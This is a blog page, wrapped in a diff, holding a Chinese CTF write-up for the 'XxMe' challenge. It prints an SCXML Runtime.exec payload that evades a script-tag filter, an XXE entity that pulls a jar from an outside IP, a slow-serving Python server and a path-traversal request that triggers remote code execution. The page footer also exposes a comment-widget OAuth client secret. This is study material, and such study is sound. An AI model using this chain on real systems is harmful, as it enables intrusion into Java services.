@@ -1,0 +1,401 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2023数字中国创新大赛 XxMe | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2023数字中国创新大赛 XxMe | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言
+文章首发自: https://xz.aliyun.com/t/12382
+属于是折磨一整天！！！
+开始坐牢
+package BOOT-INF.classes.com.example.demos;
+
+import java.io.Fil..." />
+    <meta name="keywords" content="XXE,SCXML,Java,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2023数字中国创新大赛 XxMe
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-04-01
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/xxe/" class="post-tag">
+                  # XXE
+                </a>
+              
+                <a href="https://le1a.github.io/tag/scxml/" class="post-tag">
+                  # SCXML
+                </a>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/asK-y0e-9sI/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>文章首发自: https://xz.aliyun.com/t/12382</p>
+<p>属于是折磨一整天！！！</p>
+<h1 id="开始坐牢">开始坐牢</h1>
+<pre><code class="language-java">package BOOT-INF.classes.com.example.demos;
+
+import java.io.File;
+import java.io.IOException;
+import javax.xml.parsers.DocumentBuilder;
+import javax.xml.parsers.DocumentBuilderFactory;
+import javax.xml.parsers.ParserConfigurationException;
+import org.apache.commons.scxml2.SCXMLExecutor;
+import org.apache.commons.scxml2.io.SCXMLReader;
+import org.apache.commons.scxml2.model.SCXML;
+import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.ResponseBody;
+import org.w3c.dom.Document;
+import org.w3c.dom.NodeList;
+import org.xml.sax.SAXException;
+
+@EnableAutoConfiguration
+@Controller
+public class Test {
+  private static Boolean check(String fileName) throws IOException, ParserConfigurationException, SAXException {
+    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+    DocumentBuilder builder = dbf.newDocumentBuilder();
+    Document doc = builder.parse(fileName);
+    NodeList nodes = doc.getElementsByTagName(&quot;script&quot;);
+    if (nodes.getLength() != 0)
+      return Boolean.valueOf(false); 
+    return Boolean.valueOf(true);
+  }
+  
+  @RequestMapping({&quot;/object&quot;})
+  @ResponseBody
+  public String object(@RequestParam(name = &quot;object&quot;, required = false) String object) throws Exception {
+    SCXMLExecutor executor = new SCXMLExecutor();
+    String file = &quot;file:///home&quot; + File.separator + object;
+    try {
+      if (check(file).booleanValue()) {
+        SCXML scxml = SCXMLReader.read(file);
+        executor.setStateMachine(scxml);
+        executor.go();
+        return &quot;X ME , X ME , XX ME ~~&quot;;
+      } 
+      System.out.println(&quot;nonono&quot;);
+    } catch (Exception e) {
+      System.out.println(e);
+    } 
+    return &quot;X E , X E , XX E ~&quot;;
+  }
+  
+  @RequestMapping({&quot;/xxe&quot;})
+  @ResponseBody
+  public String xxe(@RequestParam(name = &quot;uri&quot;, required = false) String uri) throws ParserConfigurationException, IOException, SAXException {
+    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+    DocumentBuilder builder = dbf.newDocumentBuilder();
+    Document doc = builder.parse(uri);
+    NodeList nodes = doc.getChildNodes();
+    String res = &quot;&quot;;
+    for (int i = 0; i &lt; nodes.getLength(); i++) {
+      if (nodes.item(i).getNodeType() == 1)
+        res = res + nodes.item(i).getTextContent(); 
+    } 
+    return res;
+  }
+}
+</code></pre>
+<p>xxe路由可以通过file协议或者netdoc协议读取文件，后者可以列目录</p>
+<p>object路由在通过check之后，读取传入的文件路径，然后进行scxml解析</p>
+<p>这个scxml最近出现了一个RCE漏洞</p>
+<p>https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/</p>
+<h1 id="scxml-rce">scxml RCE</h1>
+<p>check过滤了<code>script</code>标签，但是我们可以使用<code>assign</code>代替</p>
+<p>le1a.xml内容如下</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;
+&lt;state id=&quot;run&quot;&gt;
+&lt;onentry&gt;
+&lt;assign location=&quot;s&quot; expr=&quot;''.getClass().forName('java.lang.Runtime').getRuntime().exec('open -a calculator')&quot;/&gt;
+
+&lt;/onentry&gt;
+&lt;/state&gt;
+&lt;/scxml&gt;
+</code></pre>
+<h1 id="xxe之jar协议上传临时文件">XXE之jar协议上传临时文件</h1>
+<p>要实现rce，必须要上传我们的poc，但是这里除了xxe以外，并没有上传点，于是学习到一个trike<code>jar协议上传临时文件</code></p>
+<p>将<code>le1a.xml</code>重命名为<code>le1a.jar</code>，利用<code>jar协议</code>去读取<code>le1a.jar</code>的内容，但由于必须要使用<code>!</code>指定解压哪个文件，这里的jar本身就是我们改的后缀名，本质不是一个压缩包，所以我们随便指定一个不存在的<code>le1a.txt</code>即可</p>
+<p>xxe.xml放在http服务器上</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE foo [  &lt;!ENTITY xxe SYSTEM &quot;jar:http://101.43.66.67:4444/le1a.jar!/le1a.txt&quot; &gt;]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;
+</code></pre>
+<p>通过题目的xxe功能去访问服务器上的xxe.xml文件</p>
+<pre><code>http://127.0.0.1:8080/xxe?uri=http://101.43.66.67:7777/xxe.xml
+</code></pre>
+<p>使用<code>server.py</code>构建一个传输服务器，用于将<code>le1a.jar</code>上传到题目环境中</p>
+<pre><code class="language-python">import sys 
+import time 
+import threading 
+import socketserver 
+from urllib.parse import quote 
+import http.client as httpc 
+
+listen_host = '0.0.0.0' 
+listen_port = 4444 
+jar_file = sys.argv[1]
+
+class JarRequestHandler(socketserver.BaseRequestHandler):  
+    def handle(self):
+        http_req = b''
+        print('New connection:',self.client_address)
+        while b'\r\n\r\n' not in http_req:
+            try:
+                http_req += self.request.recv(4096)
+                print('Client req:\r\n',http_req.decode())
+                jf = open(jar_file, 'rb')
+                contents = jf.read()
+                headers = ('''HTTP/1.0 200 OK\r\n'''
+                '''Content-Type: application/java-archive\r\n\r\n''')
+                self.request.sendall(headers.encode('ascii'))
+
+                self.request.sendall(contents[:-1])
+                time.sleep(30)
+                print(30)
+                self.request.sendall(contents[-1:])
+
+            except Exception as e:
+                print (&quot;get error at:&quot;+str(e))
+
+
+if __name__ == '__main__':
+
+    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) 
+    print ('waiting for connection...') 
+    server_thread = threading.Thread(target=jarserver.serve_forever) 
+    server_thread.daemon = True 
+    server_thread.start() 
+    server_thread.join()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/01/744c7d1c4c52a.png" alt="1680351227113.png" loading="lazy"></figure>
+<p>可以看到临时文件已经存在于题目环境中，内容即为rce的poc（如果是打远程，可用netdoc协议去列出/tmp目录下的文件）</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/01/802ed83bf0115.png" alt="1680351639563.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/01/c834635243b17.png" alt="1680351664071.png" loading="lazy"></figure>
+<p>通过object路由去触发rce漏洞即可（这是我本地环境中的tmp目录，题目环境的tmp目录为/tmp）</p>
+<pre><code class="language-http">http://127.0.0.1:8080/object?object=../../../../var/folders/45/j2rhfghn4s52ky4yznld54400000gn/T/jar_cache60887227063502351.tmp
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/01/c9fa184cc17ed.png" alt="1680351777239.png" loading="lazy"></figure>
+<h1 id="打远程">打远程</h1>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/01/d895ab45886f3.png" alt="1680352562663.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/04/01/6ebd21bea3f0d.png" alt="1680352748266.png" loading="lazy"></figure>
+<p>我造！！！！！！！！！</p>
+<h1 id="参考">参考</h1>
+<p>https://jlkl.github.io/2020/08/24/Java_03/</p>
+<p>https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%BC%80%E5%A7%8B%E5%9D%90%E7%89%A2">开始坐牢</a></li>
+<li><a href="#scxml-rce">scxml RCE</a></li>
+<li><a href="#xxe%E4%B9%8Bjar%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6">XXE之jar协议上传临时文件</a></li>
+<li><a href="#%E6%89%93%E8%BF%9C%E7%A8%8B">打远程</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/TryHackMe_tomghost/">
+              <h3 class="post-title">
+                TryHackMe | tomghost
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
